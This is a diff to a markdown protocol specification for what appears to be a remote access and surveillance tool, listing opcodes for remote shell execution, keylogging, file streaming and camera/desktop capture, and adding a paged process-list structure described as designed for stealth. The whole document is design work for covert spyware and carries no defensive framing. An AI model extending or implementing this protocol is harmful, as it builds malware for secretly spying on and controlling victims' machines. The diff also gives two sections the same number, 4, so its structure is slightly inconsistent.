@@ -23,6 +23,8 @@ struct PacketHeader {
 - `0x0002` : System Information Response (Client -> Server)
 - `0x0003` : Execute Shell Command (Server -> Client)
 - `0x0004` : Shell Command Output (Client -> Server)
+- `0x0006` : Process List Request (Server -> Client)
+- `0x0007` : Paged Process List Response (Client -> Server)
 
 ### Surveillance (Gourmandise)
 - `0x0100` : Start Keylogger (Server -> Client)
@@ -30,6 +32,23 @@ struct PacketHeader {
 - `0x0102` : Keylogger Buffer Dump (Client -> Server)
 - `0x0103` : Start/Stop File Stream (Server <-> Client)
 - `0x0104` : Start/Stop Camera/Desktop Event Stream (Server <-> Client)
+
+## 4. Paged Data Structures
+
+### 4.1 Paged Process List (Opcode 0x0007)
+Designed for stealth and resilience, this data structure allows the Agent to transmit the process list in manageable chunks.
+
+| Offset | Size | Type | Description |
+|--------|------|------|-------------|
+| 0      | 2    | uint16 | Page Index (0-indexed) |
+| 2      | 1    | uint8  | Is Last Page (1 = Yes, 0 = No) |
+| 3      | 2    | uint16 | Entries in this Page |
+| 5      | -    | Seq    | Sequence of Process Entries |
+
+**Process Entry Layout:**
+- `uint32_t pid`
+- `uint16_t name_len`
+- `char name[name_len]` (No null terminator)
 
 ## 4. Endianness
 All multi-byte integers (`uint16_t`, `uint32_t`) MUST be transmitted in Network Byte Order (Big-Endian). Implementations MUST use `htonl()`/`ntohl()` and `htons()`/`ntohs()`.
